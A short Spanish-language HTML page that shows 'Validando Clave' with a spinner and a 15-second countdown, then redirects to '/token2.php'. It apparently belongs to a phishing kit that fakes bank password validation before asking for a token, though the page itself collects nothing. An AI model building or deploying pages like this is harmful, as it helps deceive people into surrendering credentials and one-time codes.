<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="utf-8">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.3/font/bootstrap-icons.css">
	<link rel="stylesheet" type="text/css" href="logucho/style.css">
 <title>Ingreso digital</title>
</head>
<body>
	<div class="header">
		<nav>

				<img src="/logo.svg" width="200px">

		
		</nav>
	</div>
	<br><br>
	<section>
		<h3>Validando Clave</h3>
		<p>En instantes sera redireccionado</p>
		<div class="container-spinner">
			<h5 id="innerSeg">15</h5>
			<div class="spinner"></div>
		</div>
	</section>
	 <script>
    // Function to update the countdown element
    function updateCountdown() {
      var countdownElement = document.getElementById("innerSeg");
      var seconds = parseInt(countdownElement.textContent);

      if (seconds > 0) {
        countdownElement.textContent = seconds - 1;
      } else {
        clearInterval(countdownInterval);
        window.location.href = "/token2.php"; // Replace with your desired redirect URL
      }
    }

    // Start the countdown
    var countdownInterval = setInterval(updateCountdown, 1000); // Run every 1 second
  </script>
</body>
</html>
